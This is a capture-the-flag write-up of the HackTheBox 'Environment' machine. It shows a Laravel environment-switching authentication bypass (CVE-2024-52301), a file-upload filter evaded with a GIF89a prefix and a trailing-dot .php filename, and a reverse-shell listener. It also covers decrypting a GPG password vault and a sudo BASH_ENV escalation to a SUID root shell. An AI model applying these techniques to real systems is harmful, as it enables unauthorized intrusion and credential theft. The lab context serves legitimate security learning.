---
layout: post
title: "HTB Environment Writeup"
date: 2025-09-08 15:22:02 -0400
categories: hackthebox HTB-medium
tags: hacking CTF HTB HTB-medium upload-bypass
---
## Introduction
This is a medium Linux machine on [HackTheBox](https://app.hackthebox.com/machines/659){:target="_blank"}{:rel="noopener noreferrer"}

![htb-environment-pwn](images/HTB-environment/htb-environment-pwn.png)

## Enumeration
### Port Scan
Let's find out what services are accessible 
```bash
rustscan -a <MACHINE-IP> -- -A -oA scan -sC
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.67:22
Open 10.10.11.67:80
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
|   256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: nginx/1.22.1
|_http-title: Save the Environment | environment.htb
| http-methods: 
|_  Supported Methods: GET HEAD
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/13%OT=22%CT=%CU=37217%PV=Y%DS=2%DC=T%G=N%TM=689D23D7
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)
```

### Directory Search

```bash
dirsearch -w /usr/share/wordlists/dirb/big.txt -r -f --threads=100 --url=environment.htb --output=dirsearch-ext.txt -e txt,php,html,js,md
```

```bash
http://environment.htb/login
```

Visiting the mailing page brings up an error message which reveals the `Laravel` version and some source code

```bash
http://environment.htb/mailing
```

![htb-environment-mailing](images/HTB-environment/htb-environment-mailing.png)

## Initial Foothold
This version of `Laravel` is vulnerable to [CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301){:target="_blank"}{:rel="noopener noreferrer"} which let's the attacker **change the application environment!**

Using the poc as a guide, we're able to change the text at the bottom of the page using the `--env` HTTP parameter

```
http://environment.htb?--env=dev
```

This doesn't do much, but causing an error on the `login` page lets us view some of the `laravel` source code. This is triggered by manipulating the `remember` value from `False` to anything using `Burp`

```
email=dasian%40mail.com&password=dasian&remember=aaaaa
```


![htb-environment-preprod](images/HTB-environment/htb-environment-preprod.png)

This tells us setting the environment to `preprod` will bypass the login!

Intercept the login `POST` request in burp and change the environment to `preprod` to login to the admin dashboard

```
POST /login?--env=preprod
```

![htb-environment-dashboard](images/HTB-environment/htb-environment-dashboard.png)

We're confronted with a file upload feature. If we can upload and access `php` files, we can execute code on the server.

Testing different payloads, we're able to upload any content with the `.gif` mime type. Adding the `GIF89a;` string will replace the necessary magic bytes.

```php
GIF89a;PHP-HERE
```

We're given the upload URL once the upload is successful. A straight `php` extension is blocked but with some header manipulation in `Burp` we can bypass the check

```
Content-Disposition: form-data; name="upload"; filename="php-test.php."
Content-Type: image/gif
```

Notice the `.` at the end of `php-test.php`. This let's us upload and run our `php` code! 

![htb-environment-php-info](images/HTB-environment/htb-environment-php-info.png)

Using the `php` reverse shell generated from [revshells](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"} we're able to get a foothold onto the server. 

```bash
nc -lvnp 4444 # listener on the attacking machine
```

![htb-environment-burp](images/HTB-environment/htb-environment-burp.png)

![htb-environment-www-data](images/HTB-environment/htb-environment-www-data.png)
## Privilege Escalation (User)

```bash
www-data@environment:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
hish:x:1000:1000:hish,,,:/home/hish:/bin/bash
```

Our next target is the `hish` user

Taking a look at `/home/hish`

```bash
www-data@environment:/home/hish$ ls -la
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Aug 15 04:46 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Aug 14 20:02 user.txt
```

`user.txt` is readable globally so we can grab the flag

![htb-environment-user-txt](images/HTB-environment/htb-environment-user-txt.png)

In `hish`'s backup directory there is a file named `keyvault.gpg`

```bash
www-data@environment:/home/hish/backup$ ls -la
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Aug 15 04:50 keyvault.gpg
```

To make `gpg` work correctly we should copy the `.gnupg` folder and `keyvault.gpg` file to a directory we have write permissions in

```bash
mkdir /tmp/.dasian
```

According to the [documentation](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration.html){:target="_blank"}{:rel="noopener noreferrer"}, we should also change the `HOME` environment variable

```bash
# important env variable to make gpg work correctly
HOME=/tmp/.dasian
cp /home/hish/backup/keyvault.gpg /tmp/.dasian
cp -r /home/hish/.gnupg /tmp/.dasian
```

Now we're able to decrypt `keyvault.gpg`

```bash
www-data@environment:~$ gpg -d keyvault.gpg 
gpg: WARNING: unsafe permissions on homedir '/tmp/.dasian/.gnupg'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> m*************!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

The `ENVIRONMENT.HTB` entry lets us login as `hish`

## Root
As `hish` we can run a command with `sudo`

```bash
sudo -l
```

```bash
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

The `env_keep` flag preserves the `ENV` and `BASH_ENV` variables when running `/usr/bin/systeminfo`

According the [the docs](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV){:target="_blank"}{:rel="noopener noreferrer"}, the `BASH_ENV` variable lets us specify a shell script to run before execution. Since we can run the command as `root`, we can essentially run any privileged command!

For this example I'll create a `bash` binary with the `suid` bit set to give us  a local `root` shell!

```bash
#!/bin/bash
cp /bin/bash /tmp/.dasian/bash
chmod +s /tmp/.dasian/bash
```

Make the script executable and set its path in the `BASH_ENV` variable

```bash
chmod +x suid-bash.sh
export BASH_ENV=/tmp/.dasian/suid-bash.sh
```

Run `systeminfo` to execute the script as `root`

```bash
sudo /usr/bin/systeminfo
```

Now we can activate a `root` shell and grab the `root` flag!

```bash
/tmp/.dasian/bash -p
```

![htb-environment-root-txt](images/HTB-environment/htb-environment-root-txt.png)
## Recap
Triggering errors on the website exposes the `Laravel` version and a snippet of the source code. This version is vulnerable to [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301){:target="_blank"}{:rel="noopener noreferrer"} where an attacker can **change the environment**. Causing an error on the login page reveals a development environment **that bypasses authentication.**

The new dashboard lets us upload image files. By manipulating the content headers and mime type to imitate a `.gif` file, we can **bypass upload restrictions** and put a `php` file onto the server, achieving **remote code execution** and giving us a foothold into the system.

Enumerating world readable files in `hish`'s home, we find a `gnupg` key vault. Copying these files and changing the `HOME` environment variable, we can **decrypt the keys** and obtain the user password.

The user can run a `sudo` command and control the `BASH_ENV` variable. This lets us **run a script as root** before running our elevated program.

